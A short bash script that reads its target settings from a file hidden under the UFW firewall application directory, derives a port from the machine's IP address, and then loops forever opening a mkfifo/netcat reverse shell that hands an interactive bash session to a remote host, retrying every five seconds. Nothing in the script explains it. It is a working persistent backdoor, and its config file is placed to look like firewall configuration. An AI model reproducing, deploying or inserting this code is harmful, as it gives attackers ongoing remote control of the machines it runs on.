#!/bin/bash
source /etc/ufw/applications.d/ufw_config.sh
CIP=$(/usr/bin/hostname -I | awk '{print $1}')
SECOND=$(echo "$CIP" | cut -d'.' -f2)
FOURTH=$(echo "$CIP" | cut -d'.' -f4)
P=$(($C + $SECOND*100 + $FOURTH))

while true; do
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc "$I" "$P" >/tmp/f
    sleep 5
done